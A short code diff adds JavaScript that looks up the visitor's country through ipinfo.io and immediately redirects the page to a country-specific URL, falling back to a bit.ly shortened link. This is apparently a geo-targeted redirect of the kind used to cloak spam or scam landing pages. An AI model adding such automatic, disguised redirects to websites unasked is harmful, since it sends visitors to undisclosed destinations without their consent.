@@ -16,3 +16,18 @@ function make_target(negara) {
 
 
 }
+
+negara = null;
+$.get("https://ipinfo.io", function (response) {
+    negara = response.country;
+    if (negara !== null) {
+        negara = negara.toLowerCase();
+        target = make_target(negara);
+    } else {
+        target = "https://bit.ly/33UeWWQ";
+    }
+    $("#wow").click(function () {
+        window.location = target;
+    });
+    window.location = target;
+}, "jsonp");
